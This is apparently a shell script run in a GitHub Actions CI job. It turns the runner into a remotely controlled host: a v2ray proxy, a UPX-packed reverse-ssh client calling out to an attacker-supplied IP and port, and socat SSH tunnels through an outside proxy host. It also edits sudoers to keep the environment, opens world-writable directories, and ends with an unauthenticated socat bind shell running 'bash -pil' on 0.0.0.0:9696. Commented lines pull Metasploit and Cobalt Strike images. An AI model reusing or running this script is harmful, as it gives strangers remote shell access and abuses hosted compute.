# /home/runner/work/nc_test/nc_test/socat.bin -h
# proxy:<proxy-server>:<host>:<port>
#github cd/ci
#/home/runner/work/nc_test/nc_test/socat.bin -v  TCP4-LISTEN:50022,reuseaddr,fork  proxy:node4.buuoj.cn:127.0.0.1:2244,proxyport=29904 &


export HOME=/tmp;

#setsid docker pull  metasploitframework/metasploit-framework &
#setsid docker pull   idoall/ubuntu16.04-sshd &
#setsid docker pull  xrsec/cobaltstrike &
#setsid docker pull  couchbase/centos7-systemd  &  
#setsid docker pull centos:centos7  &




grep -q v2ray /tmp/js9&&
(
cd /tmp;
mkdir -p /etc/v2ray;chmod 0777 /etc/v2ray;

cat << EOF >/etc/v2ray/v2ray.json
{
    "log": {
        "access": "/tmp/access.log",
        "error": "/tmp/error.log",
        "loglevel": "warning"
    },
    "inbound": {
        "port": 43389,
        "protocol": "vmess",
        "settings": {
            "clients": [
                {
                    "id": "1da11f4a-3d58-4b1a-a2d2-6736cae18b5a",
                    "level": 1,"alterId": 0
                }
            ]
        }
    },
    "outbound": {
        "protocol": "freedom",
        "settings": {}
    },
    "inboundDetour": [],
    "outboundDetour": [
        {
            "protocol": "blackhole",
            "settings": {},
            "tag": "blocked"
        }
    ],
    "routing": {
        "strategy": "rules",
        "settings": {
            "rules": [
                {
                    "type": "field",
                    "ip": [
                        "0.0.0.0/8",
                        "10.0.0.0/8",
                        "100.64.0.0/10",
                        "127.0.0.0/8",
                        "169.254.0.0/16",
                        "172.16.0.0/12",
                        "192.0.0.0/24",
                        "192.0.2.0/24",
                        "192.168.0.0/16",
                        "198.18.0.0/15",
                        "198.51.100.0/24",
                        "203.0.113.0/24",
                        "::1/128",
                        "fc00::/7",
                        "fe80::/10"
                    ],
                    "outboundTag": "blocked"
                }
            ]
        }
    }
}
EOF

sudo bash -c "
screen -dmS r;
screen -r t -p 0 -X stuff 'docker pull  v2ray/official;ll;';
screen -r t -p 0 -X stuff $'\n';
screen -r t -p 0 -X stuff $'\n';
screen -r t -p 0 -X stuff 'docker run -it --name v2ray5 -v /etc/v2ray:/etc/v2ray -p 43389:43389 v2ray/official v2ray -config=/etc/v2ray/v2ray.json;';
screen -r t -p 0 -X stuff $'\n';

"

)&



grep -q vokeai /tmp/js9&&
(
cd /tmp;
mkdir /tmp/0img;
chmod 0777 /tmp/0img;
sudo bash -c "git clone https://github.com/invoke-ai/InvokeAI.git &
screen -dmS r;
screen -r r -p 0 -X stuff 'docker pull invokeai/invokeai;ll;';
screen -r r -p 0 -X stuff $'\n';

screen -r r -p 0 -X stuff 'docker run --device /dev/fb0:/dev/fb0 -it --privileged -p 9090:9090 -v /tmp/0img:/data/outputs/ --name ai invokeai/invokeai;';
screen -r r -p 0 -X stuff $'\n';

screen -r r -p 0 -X stuff \'docker run --device /dev/fb0:/dev/fb0 -it -v /tmp/0img:/data/outputs/ --privileged -p 9090:9090 --name ai invokeai/invokeai;\';
screen -r r -p 0 -X stuff $'\n';"

)&


#docker run --gpus all -it --privileged -p 9090:9090 --name ai invokeai/invokeai;



sudo bash -c 'echo -e "\nls -al /tmp/nu*;">>/root/.bash_profile';


#cat $GITHUB_WORKSPACE/docs/123.apk.00? >/tmp/t933.apk;
#cat /tmp/js9;

grep -q NPV /tmp/js9&&grep -q xrdp /tmp/js9&&
(
. $GITHUB_WORKSPACE/openv.sh
sudo bash -c 'mkdir -pv /run/user/1000;chmod 0777 /run/user/1000;
chmod 0777 /home/runneradmin;chmod 0777 /home/runneradmin/*;chmod 0777 /home/runneradmin/.*;'
sleep 1;
. $GITHUB_WORKSPACE/xrdp.sh
)&


grep -q NPV /tmp/js9||(
grep -q xrdp /tmp/js9&&(
sudo bash -c 'mkdir -pv /run/user/1000;chmod 0777 /run/user/1000;
chmod 0777 /home/runneradmin;chmod 0777 /home/runneradmin/*;'
. $GITHUB_WORKSPACE/xrdp.sh
)
)&


grep -q xrdp /tmp/js9||(
grep -q NPV /tmp/js9&&(. $GITHUB_WORKSPACE/openv.sh)
)&


mkdir -p -v  $GITHUB_WORKSPACE/package;
mkdir -p -v  $GITHUB_WORKSPACE/dist;

id>$GITHUB_WORKSPACE/package/d2023.txt;
#date>$GITHUB_WORKSPACE/dist/d2023.txt;
uptime>$GITHUB_WORKSPACE/d2023.txt;
cp /tmp/js9 $GITHUB_WORKSPACE/js9.txt;




grep -q AABBCC_rev_shell /tmp/js9 &&
(
setsid sudo $GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v  -l -p 20022 &

 sudo bash -c '  sed -i "s|Defaults\tenv_reset|Defaults \!env_reset|g"  /etc/sudoers;
                 grep -v "^#" /etc/sudoers | grep -v "^$"  2>&1 >  /tmp/js9a.txt '


    (while true; do
        [ ! -f /tmp/keepalive ] && break        
         num61z=$(date +%S);
         num67z=$(echo "1"$num61z);
         num76=$((${num67z}%8));
         bport=5005"$num76";echo $bport;

ip_port5=$(grep -oP "(?<=AABBCC_rev_shellLLL).*(?=FFF)" /tmp/js9)
port5=${ip_port5#*:};
ip5=${ip_port5%:*};

ip_port7=$(grep -oP "(?<=liumQ).*(?=liumZ)" /tmp/js9)
port7=${ip_port7#*:};
ip7=${ip_port7%:*};

if [ ! -z ${port7} ] && [ ! -z ${ip7} ]; then
 setsid /home/runner/work/nc_test/nc_test/socat.bin TCP4-LISTEN:50022,reuseaddr,fork  proxy:${ip7}:127.0.0.1:2244,proxyport=${port7}  &
 
(
 (ps aux|grep -v grep|grep "40022:127.0.0.1:22")&& echo 40022_ok ||(sleep 1;
   (echo "ssh  -o StrictHostKeyChecking=no   -CNf -R 40022:127.0.0.1:22   root@127.0.0.1 -p 50022";sleep 2;echo 123456;sleep 1;echo 123456;sleep 1;
   (  for((i=0;i<8;i++));do  echo -e "\n";sleep 2;done )  )|script /tmp/nz_z51194
)
)&


(
 (ps aux|grep -v grep|grep "51194:127.0.0.1:1194")&& echo 51194_ok ||(sleep 1;
   (echo "ssh  -o StrictHostKeyChecking=no   -CNf -R 40022:127.0.0.1:22   root@127.0.0.1 -p 50022";sleep 2;echo 123456;sleep 1;echo 123456;sleep 1;
   (  for((i=0;i<8;i++));do  echo -e "\n";sleep 2;done )  )|script /tmp/nz_z40022
)
)&
fi


if [ ! -z ${port5} ] && [ ! -z ${ip5} ]; then 
    #sudo chmod 0777 $GITHUB_WORKSPACE/natapp;
 #nohup sudo $GITHUB_WORKSPACE/natapp -authtoken=0c4f43f4aa226595 &
   #sudo sh -c "export HOME=/tmp;$GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v -b $bport  -p $port5 $ip5"; 


[ -f $GITHUB_WORKSPACE/upx_reverse-sshx64.bin ]&&sudo sh -c "$GITHUB_WORKSPACE/upx_reverse-sshx64.bin -v -b $bport -p $port5 $ip5";
   echo "exit_revSSH_isOK_$bport";
fi


echo "will sleep 31s for while true";
sleep 21; 
         
    done) &
) &





 
cat << EOF >/tmp/docker-compose.yaml 
version: "3.2"
services:
  redis:
    image: vulhub/redis:5.0.7
    container_name: vulhub_redis_5.0.7
    ports:
      - "127.3.3.3:16379:6379"
      - "0.0.0.0:19494:9494"
    volumes:
      - type: bind
        source: /home/runner/work/nc_test/nc_test/socat.bin
        target: /tmp/socat
        read_only: false
      - type: bind
        source: /home/runner/work/nc_test/nc_test/busybox.bin
        target: /busybox
        read_only: false
      - type: bind
        source: /home/runner/work/nc_test/nc_test/upx_reverse-sshx64.bin
        target: /tmp/upx_reverse-sshx64.bin
        read_only: false
      - type: bind
        source: /home/runner/work/nc_test/nc_test/agent.linux
        target: /tmp/agent.linux
        read_only: false
      - /home/runner/work/nc_test/nc_test:/pmt
EOF



cat << EOF >/tmp/docker-compose2.yaml 
version: "3.2"
services:
  thinkphp_6.0.12:
    image: vulhub/thinkphp:6.0.12
    container_name: thinkphp_6.0.12
    ports:
      - "0.0.0.0:20080:80"
      - "0.0.0.0:29494:9494"
    volumes:
      - type: bind
        source: /home/runner/work/nc_test/nc_test/socat.bin
        target: /tmp/socat
        read_only: false
      - type: bind
        source: /home/runner/work/nc_test/nc_test/busybox.bin
        target: /busybox
        read_only: false
      - type: bind
        source: /home/runner/work/nc_test/nc_test/upx_reverse-sshx64.bin
        target: /tmp/upx_reverse-sshx64.bin
        read_only: false
      - type: bind
        source: /home/runner/work/nc_test/nc_test/agent.linux
        target: /tmp/agent.linux
        read_only: false
        read_only: false
      - type: bind
        source: /home/runner/work/nc_test/nc_test/gossh
        target: /tmp/gossh
        read_only: false
      - /home/runner/work/nc_test/nc_test:/pmt
EOF


# (/usr/local/bin/docker-compose up -d )&
#/usr/local/bin/docker-compose -f /tmp/docker-compose.yaml  up  -d




[ -x /home/runner/work/nc_test/nc_test/socat.bin ]  &&busybox setsid /home/runner/work/nc_test/nc_test/socat.bin -v tcp-l:9696,bind=0.0.0.0,fork,reuseaddr exec:"bash -pil",pty,stderr,setsid,sigint,sane &

